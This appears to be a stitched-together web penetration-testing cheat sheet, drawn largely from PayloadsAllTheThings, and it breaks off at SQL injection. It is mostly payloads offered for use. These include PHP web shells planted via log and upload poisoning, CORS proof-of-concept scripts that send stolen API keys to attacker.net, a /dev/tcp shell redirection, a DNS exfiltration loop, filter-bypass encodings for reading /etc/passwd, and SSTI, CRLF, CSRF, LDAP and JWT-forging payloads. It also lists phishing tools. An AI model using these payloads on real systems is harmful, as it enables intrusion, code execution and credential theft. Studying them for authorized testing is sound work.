## LFI to RCE via /proc/*/fd

1. Upload a lot of shells (for example : 100)
2. Include `/proc/$PID/fd/$FD` where `$PID` is the PID of the process and `$FD` the filedescriptor. Both of them can be bruteforced.

```ps1
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

## LFI to RCE via /proc/self/environ

Like a log file, send the payload in the `User-Agent` header, it will be reflected inside the `/proc/self/environ` file

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
## LFI to RCE via upload

If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```
## LFI to RCE via phpinfo()

PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.

> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.

Use the script [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

### RCE via SSH

Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

Then include the SSH log files inside the Web Application.

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### RCE via Mail

First send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

In some cases you can also send the email with the `mail` command line.

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### RCE via Apache logs

Poison the User-Agent in access logs:

```ps1
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.

Then request the logs via the LFI and execute your command.

```ps1
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

---

# 10. Missing or Insufficient SPF Record

**Description:** If a domain lacks an SPF record, attackers can send phishing emails that appear legitimate.

### **Tools:**
- [MXToolbox](https://mxtoolbox.com/)
- [SPF Validator](https://www.kitterman.com/spf/validate.html)

### **Exploitation Example:**
```text
From: support@hubspot.net
To: victim@gmail.com
Subject: Email Forgery due to missing SPF
```

**Phishing Tools:**
- [Emkei.cz](https://emkei.cz/)
- [Anonymous Email](https://anonymousemail.me/)
- [5YMail](https://www.5ymail.com/)

---
# CORS (Cross-Origin Resource Sharing) Security Testing Guide

## 1. Testing CORS Misconfigurations (Origin Reflection)

### Steps to Check CORS Vulnerability:
1. Origin Reflection - Add an `Origin` header.

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```
#### Proof Of Concept

This PoC requires that the respective JS script is hosted at `evil.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

or

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### Null Origin

#### Vulnerable Implementation

It's possible that the server does not reflect the complete `Origin` header but
that the `null` origin is allowed. This would look like this in the server's
response:

```ps1
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof Of Concept

This can be exploited by putting the attack code into an iframe using the data
URI scheme. If the data URI scheme is used, the browser will use the `null`
origin in the request:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```
### Wildcard Origin without Credentials

If the server responds with a wildcard origin `*`, **the browser does never send
the cookies**. However, if the server does not require authentication, it's still
possible to access the data on the server. This can happen on internal servers
that are not accessible from the Internet. The attacker's website can then
pivot into the internal network and access the server's data without authentication.

```powershell
* is the only wildcard origin
https://*.example.com is not valid
```

#### Vulnerable Implementation

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

#### Proof Of Concept

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```
### Expanding the Origin

Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.

#### Vulnerable Implementation (Example 1)

In this scenario any prefix inserted in front of `example.com` will be accepted by the server.

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof of Concept (Example 1)

This PoC requires the respective JS script to be hosted at `evilexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

#### Vulnerable Implementation (Example 2)

In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof of concept (Example 2)

This PoC requires the respective JS script to be hosted at `apiiexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```
3. Vulnerable Implementation (Example 2) - Check for internal applications (same-site origin).

### Insecure Configurations Detection (Response Headers):
```bash
curl -s --head 'http://api.view.yahoo.com/api/session/preferences'
curl -s --head 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: http://view.yahoo.com'
```

**Vulnerable Headers:**
```
Access-Control-Allow-Origin: http://www.evil.com
Access-Control-Allow-Origin: *
```
- `*` means it is allowing all domains (vulnerable setup).

### Exploitation:
- Look for `embed` parameters in URLs (`embed?url=`).
- Modify `Origin`, `Pragma`, and `Referer` headers:
   ```
   Host: hackerseera.com
   Origin: http://bing.com
   Pragma: no-cache
   Referer: https://bing.com/
   ```
- If response shows `Access-Control-Allow-Origin: http://bing.com`, the site is vulnerable.
- Also, try `Origin: null`.

### Poorly Implemented CORS:
```bash
Access-Control-Allow-Origin: https://anysite.com
Access-Control-Allow-Credentials: true
```
- If `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`, it's misconfigured but not always exploitable.

### Exploit with Curl:
```bash
curl http://any.com -H "Origin: http://www.bing.com" -I
```
## Tools

* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
----- 

# CRLF Injection

## Methodology

HTTP Response Splitting is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and the start of a new line in HTTP responses.

**CRLF Characters**:

* `CR` (`\r`, ASCII 13): Moves the cursor to the beginning of the line.
* `LF` (`\n`, ASCII 10): Moves the cursor to the next line.

By injecting a CRLF sequence, the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can result in various security issues, such as:

* Cross-Site Scripting (XSS): Injecting malicious scripts into the second response.
* Cache Poisoning: Forcing incorrect content to be stored in caches.
* Header Manipulation: Altering headers to mislead users or systems

### Session Fixation

A typical HTTP response header looks like this:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```

If user input `value\r\nSet-Cookie: admin=true` is embedded into the headers without sanitization:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```

Now the attacker has set their own cookie.

### Cross Site Scripting

Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).

**Requested page**:

```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```
```
http://www.example.net/index.php?lang=en
Content-Length: 0
 
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34
 
<html>You have been Phished</html>
```

**HTTP response**:

```http
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .

**Requested page**:

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```
```
http://example.com/
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
//..
```
**HTTP Response**:

```http
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

### Open Redirect

Inject a `Location` header to force a redirect for the user.

```ps1
%0d%0aLocation:%20http://myweb.com
```

## Filter Bypass

[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset.

> Newly defined header fields SHOULD limit their field values to US-ASCII octets.

Firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.

| UTF-8 Character | Hex | Unicode | Stripped |
| --------- | --- | ------- | -------- |
| `嘊` | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
| `嘍` | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
| `嘾` | `%E5%98%BE` | `\u563e` | `%3E` (>)  |
| `嘼` | `%E5%98%BC` | `\u563c` | `%3C` (<)  |

The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.

An example payload using UTF-8 characters would be:

```js
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

URL encoded version

```js
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
```

### Exploitation Examples:
#### Add a Cookie:
```
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```
#### Bypass XSS Protection:
```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a<svg onload=alert(document.domain)>
```
#### Write HTML Response:
```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

## 3. Server-Side Request Forgery (SSRF)

### Exploitation Techniques:
1. Abuse trust:
   ```
   any.com/index/php?uri=http://external.com
   ```
2. Bypass IP whitelisting:
   ```
   any.com/index/php?uri=file:/etc/passwd
   ```
3. Scan internal networks:
   ```
   any.com/index/php?uri=http://localhost:1
   ```
4. Cloud metadata extraction:
   ```
   http://169.254.169.254/latest/meta-data/
   ```

### Testing with Burp Collaborator:
1. Open Burp Collaborator.
2. Set interaction poll.
3. Inject payload in a vulnerable parameter:
   ```
   /showimage.php?file=http://burp-collaborator-url
   ```
4. Check logs in Burp for external requests.

## 4. Critical Files Exposure

### Impact:
- Exposure of sensitive files like `database credentials`, `server authentication data`, or `business logic information`.

### Scanning:
```bash
dirb http://target.com/ wordlist.txt
gobuster dir -u http://target.com/ -w wordlist.txt
```

## Cross-Site Request Forgery (CSRF)

### Exploitation:
#### Logout CSRF:
```html
<img src="http://target.com/logout.php">
```
#### Account Takeover CSRF:
1. Capture a profile update request.
2. Change `email` field in CSRF PoC.
3. Open PoC in browser and submit.

### JSON GET - Simple Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```


### JSON POST - Simple Request

With XHR :

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

With autosubmit send form, which bypasses certain browser protections such as the Standard option of [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) in Firefox browser :

```html
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
// this input will send : {"role":admin,"other":"="}
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>
```

### JSON POST - Complex Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## 6. Two-Factor Authentication (2FA) Bypass

### Exploitation:
- Login to an account where 2FA is implemented.
- Try directly accessing resources after authentication without entering OTP.

## 7. Hostile Subdomain Takeover

### Attack Scenario:
1. Find subdomains that point to inactive services.
2. Register on the third-party service and claim the subdomain.
3. Set up phishing attacks on the hijacked subdomain.

### Scanning for Takeovers:
```bash
ruby sub_brust.rb --fast nokia.com
```

## References:
- [PayloadsAllTheThings - CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
- [SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF)
- [CSRF Exploits](https://github.com/qazbnm456/awesome-web-security/blob/master/README.md#csrf---cross-site-request-forgery)

---
# Security Testing Techniques

## 13. Command Injection

### Tool:
- [Commix](https://github.com/commixproject/commix)

Example of Command Injection with PHP:
Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:
```
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```
### Identification:
Find an input field that interacts with the operating system shell. Try executing system shell commands using delimiters.

**Example:**
```bash
ping -c 5 127.0.0.1
```

### Chaining Commands

In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. 


* `;` (Semicolon): Allows you to execute multiple commands sequentially.
* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.

```powershell
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
```

**Possible Parameters:**
`filename, darmon, host, upload, dir, execute, download, log, ip, cli, cmd, file=`

**Example:**
```bash
;ls &&ls ||ls
```

### Bypass Methods:
```bash
;^& && | || %0D %0A \n <
```

### Brute-force:
- Use a payload list of commands (`cmd.txt`).
- Use a delimiter list (`delimeter_list`).
- Cluster bomb attack: Combines different delimiters with parameters sequentially.

**Setting Payload in Injection Point:**
```bash
filename=$delimeter.txt$$cmd.txt$
```

**Burp Suite Intruder:**
- Use the cluster bomb attack type.
- Set two payloads to generate combinations of attacks.

### Exploitation Tool:
```bash
python commix.py -u <url>
```

### Chaining Commands:
```bash
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls  # Only if the first command fails
```

### Inside a Command:
```bash
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```

### Bypass Techniques:
```bash
w'h'o'am'i  # Single quotes bypass
w"h"o"am"i  # Double quotes bypass
w\ho\am\i  # Backslash bypass
/\b\i\n/////s\h  # Slash bypass
who$@ami  # Using $@
echo $0   # Identifying shell
```
## Filter Bypasses

### Bypass Without Space

* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead. 
  ```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
  ```
* In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.
  ```powershell
  {cat,/etc/passwd}
  ```
* Input redirection. The < character tells the shell to read the contents of the file specified. 
  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```
* ANSI-C Quoting 
  ```powershell
  X=$'uname\x20-a'&&$X
  ```
* The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.
  ```powershell
  ;ls%09-al%09/home
  ```
* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.
  ```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
  ```


### Bypass With A Line Return

Commands can also be run in sequence with newlines

```bash
original_cmd_by_server
ls
```


### Bypass With Backslash Newline

* Commands can be broken into parts by using backslash followed by a newline
  ```powershell
  $ cat /et\
  c/pa\
  sswd
  ```
* URL encoded form would look like this:
  ```powershell
  cat%20/et%5C%0Ac/pa%5C%0Asswd
  ```


### Bypass With Tilde Expansion

```powershell
echo ~+
echo ~-
```

### Bypass With Brace Expansion

```powershell
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```


### Bypass Characters Filter

Commands execution without backslash and slash - linux bash

```powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

### Bypass Characters Filter Via Hex Encoding

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### Bypass With Single Quote

```powershell
w'h'o'am'i
wh''oami
'w'hoami
```

### Bypass With Double Quote

```powershell
w"h"o"am"i
wh""oami
"wh"oami
```

### Bypass With Backticks

```powershell
wh``oami
```

### Bypass With Backslash and Slash

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

### Bypass With $@

`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.

```powershell
who$@ami
echo whoami|$0
```


### Bypass With $()

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

### Bypass With Variable Expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

### Bypass With Wildcards

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```
### Dns Based Data Exfiltration

Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)

1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
  ```powershell
  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
  ```

Online tools to check for DNS based data exfiltration:

- http://dnsbin.zhack.ca/
- https://app.interactsh.com/
- Burp Collaborator

---
Click-Jacking

```
<iframe src="http://target site" security="restricted"></iframe>
```
```
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">Click me</a>
</div>
```
## 14. File Uploading

### Tools:
- [Fuxploider](https://github.com/almandin/fuxploider)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

### Methods:
1. **Simple File Upload**
   - Upload `c99.php` or `dhanush.php` for execution.
   - Use `nc.exe` for a reverse shell (Windows).
2. **Content-Type Bypass**
   - Modify the `Content-Type` header in Burp Suite.
   - Example: Change `text/php` to `image/jpeg`.
3. **Extension Verification Bypass**
   - Use double extensions (`shell.php.jpg`).

### Tool:
- [FuzzDB Malicious Images](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/malicious-images)

---

## 15. XML External Entity (XXE) Injection

### Payload:
```xml
<foo><text>Xml testing</text></foo>
```

### Exploitation:
- Use `Burp Suite Intruder` to automate attacks.
- Use `xml-attacks` payloads.

---

## Web Cache Deception Attack

### Steps:
1. Browse normally: `https://www.example.com/myaccount/home/`
2. Open malicious link: `https://www.example.com/myaccount/home/malicious.css`
3. The cache saves the page.
4. Open in a private tab: `https://www.paypal.com/myaccount/home/malicious.css`

### Cache Poisoning Headers:
- `X-Forwarded-Host`
- `X-Host`
- `X-Forwarded-Scheme`
- `X-Original-URL`
- `X-Rewrite-URL`

### Example Attack:
```http
GET /test?buster=123 HTTP/1.1
Host: target.com
X-Forwarded-Host: test"><script>alert(1)</script>
```

---

## Insecure Direct Object References (IDOR)

### Tools:
- Burp Suite Plugins: `Authz`, `AuthMatrix`, `Authorize`

### Example Parameters:
- `http://foo.bar/somepage?invoice=12345`
- `http://foo.bar/changepassword?user=someuser`
- `http://foo.bar/showImage?img=img00011`

---

## XPATH Injection

### Example Payloads:
```xpath
' or '1'='1
' or ''=''
x' or 1=1 or 'x'='y
```

### Blind Exploitation:
```xpath
and string-length(account)=SIZE_INT
```

### Tools:
- [xcat](https://github.com/orf/xcat)
- [xxxpwn](https://github.com/feakk/xxxpwn)
- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [XmlChor](https://github.com/Harshal35/XMLCHOR)

---

## XSLT Injection

### Description:
Processing an unvalidated XSL stylesheet can allow an attacker to change XML structure, include arbitrary files, or execute commands.

### Tools:
- [PayloadsAllTheThings - XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#tools)

---

## Template Injection (SSTI)

### Tools:
- [Tplmap](https://github.com/epinna/tplmap)

### Basic Injections:
#### ERB Engine:
```erb
<%= 7 * 7 %>
<%= File.open('/etc/passwd').read %>
<%= system('cat /etc/passwd') %>
```

#### Java:
```java
${7*7}
${class.getClassLoader()}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
```

#### Twig:
```twig
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

---
# JSON Web Token (JWT) Exploitation & SQL Injection Techniques

## JWT - JSON Web Token
JSON Web Token follows the format:
```
Base64(Header).Base64(Data).Base64(Signature)
```
### Example
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY
```
JWT is split into three parts:
- **Header**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`
- **Payload**: `eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ`
- **Signature**: `UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

Default algorithm: **HS256** (HMAC SHA256 symmetric encryption). For asymmetric purposes, **RS256** is used.

#### Header Example
```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```
#### Payload Example
```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```
### Exploiting JWT Vulnerabilities
#### Modify JWT Signature to None Algorithm
```python
import jwt

jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'

# Decode the token
decodedToken = jwt.decode(jwtToken, verify=False)
noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

print(noneEncoded.decode())
```
#### Output:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.
```
#### Brute-force JWT Secret Key
```sh
git clone https://github.com/ticarpi/jwt_tool
python2.7 jwt_tool.py <JWT_TOKEN> /tmp/wordlist
```
Reference: [PayloadsAllTheThings - JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

---

## LDAP Injection
LDAP Injection exploits applications that construct LDAP queries based on user input.

### Basic Injection Example
```sh
user  = *)(uid=*))(|(uid=*
pass  = password
query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
```
### Common LDAP Payloads
```sh
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```
---

## OAuth Exploitation
- Stealing OAuth Token via Referer
- Grabbing OAuth Token via `redirect_uri`
- Executing XSS via `redirect_uri`
- OAuth Private Key Disclosure
- Authorization Code Rule Violation
- Cross-Site Request Forgery (CSRF)

Reference: [PayloadsAllTheThings - OAuth](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth)

---

## SQL Injection (SQLi)
SQL Injection can be:
- GET Based
- POST Based
- Header Based
- Cookie Based

### SQL Injection Detection Payloads
```sh
'
%27
"
%22
#
%23
;
%3B
)
%25%27
/
%3B
```
#### Logical Testing
```sh
